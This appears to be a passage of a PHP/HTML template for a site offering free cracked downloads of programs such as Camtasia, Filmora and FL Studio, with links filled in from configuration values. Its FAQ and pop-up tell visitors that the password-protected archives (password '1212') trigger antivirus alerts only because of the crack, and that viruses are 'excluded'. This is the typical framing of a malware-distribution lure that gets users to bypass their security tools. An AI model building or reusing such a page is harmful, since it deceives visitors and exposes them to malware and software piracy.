                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img src="https://s3.tradingview.com/userpics/2581989-32yN_orig.png">
                            </picture>
                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">TradingView</h3>
                                <p class="uk-margin-remove"></p>
                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['TradingView'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon"><svg width="16"
                                                height="16" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img src="https://static.bandicam.com/company/bandicam-official-logo-icon.png">
                            </picture>
                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">Bandicam</h3>
                                <p class="uk-margin-remove"></p>
                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['Bandicam'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon"><svg width="16"
                                                height="16" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img
                                    src="https://spng.pngfind.com/pngs/s/444-4442075_camtasia-logo-png-camtasia-studio-logo-png-transparent.png">
                            </picture>
                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">Camtasia</h3>
                                <p class="uk-margin-remove"></p>
                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['Camtasia'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon"><svg width="16"
                                                height="16" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img
                                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Wondershare_filmora_logo.svg/2048px-Wondershare_filmora_logo.svg.png">
                            </picture>
                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">Wondershare Filmora</h3>
                                <p class="uk-margin-remove"></p>
                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['Filmora'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon"><svg width="16"
                                                height="16" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img src="https://i.pinimg.com/originals/ea/5b/58/ea5b5879e70251a8213ee454444b3e3c.png">
                            </picture>
                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">FL Studio</h3>
                                <p class="uk-margin-remove"></p>
                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['FLStudio'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon"><svg width="16"
                                                height="16" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                </div>
            </div>
        </section>

        <section class="uk-section" id="faq">
            <div class="uk-container">
                <h2 class="uk-heading-small">Any questions?</h2>

                <ul data-uk-accordion="" class="uk-accordion">
                    <li>
                        <a class="uk-accordion-title" href="#">How do I download the software?</a>
                        <div class="uk-accordion-content" hidden="">
                            <p>You only need to select the program you are interested in and click the "Download"
                                button, then the download will begin!</p>
                        </div>
                    </li>
                    <li>
                        <a class="uk-accordion-title" href="#">Am I downloading the software for
                            free?</a>
                        <div class="uk-accordion-content" hidden="">
                            <p>Yes, it's absolutely free. You can download any software you like and download them at
                                high speed without registration, torrents and SMS.</p>
                        </div>
                    </li>
                    <li>
                        <a class="uk-accordion-title" href="#">Why is the archive under a
                            password?</a>
                        <div class="uk-accordion-content" hidden="">
                            <p>Crack is already installed in the downloaded software, because of this, Windows Defender
                                and other antiviruses swear at it. Don't worry, we check all the software before
                                publishing them.</p>
                        </div>
                    </li>
                    <li>
                        <a class="uk-accordion-title" href="#">What about viruses?</a>
                        <div class="uk-accordion-content" hidden="">
                            <p>Don't worry, we check the published software very carefully, viruses are excluded.</p>
                        </div>
                    </li>
                </ul>
            </div>
        </section>
    </main>

    <footer class="uk-section uk-section-xsmall">
        <div class="uk-container">
            <div class="uk-flex-middle uk-child-width-1-1@s uk-child-width-1-2@m uk-grid" data-uk-grid="">
                <div class="uk-text-center uk-text-left@m uk-first-column">
                    <a href=""><img src="./assets/images/dark-logo.png" alt=""></a>
                </div>
                <div>
                    <div class="uk-flex-right uk-grid-small uk-child-width-1-1@s uk-child-width-auto@m uk-text-center uk-text-left@m uk-grid"
                        data-uk-grid="">
                        <div class="uk-first-column"><a href="#adobe" data-uk-scroll="">Adobe</a>
                        </div>
                        <div><a href="#software" data-uk-scroll="">Software</a></div>
                        <div><a href="#faq" data-uk-scroll="">FAQ</a></div>
                    </div>
                </div>
            </div>
        </div>
    </footer>

    <div id="modal" class="uk-flex-top" data-uk-modal="">
        <div class="uk-modal-dialog uk-margin-auto-vertical uk-width-1-1@s uk-width-1-2@m uk-width-1-4@l">

            <button class="uk-modal-close-default" type="button" data-uk-close=""></button>

            <div class="uk-modal-body">
                <h3 class="uk-heading uk-margin-small" id="title"></h3>
                <p class="uk-margin-small" id="description">Crack is already installed in the downloaded software,
                    because of this, Windows Defender and other antiviruses swear at it. Don't worry, we check all the
                    software before publishing them.</p>

                <ul data-uk-accordion="">
                    <li>
                        <a class="uk-accordion-title" href="#">Password to the archive</a>
                        <div class="uk-accordion-content">
                            <p id="password">1212</p>
                        </div>
                    </li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function showModal() {
            UIkit.modal("#modal").show();
        }
    </script>
</body>

</html>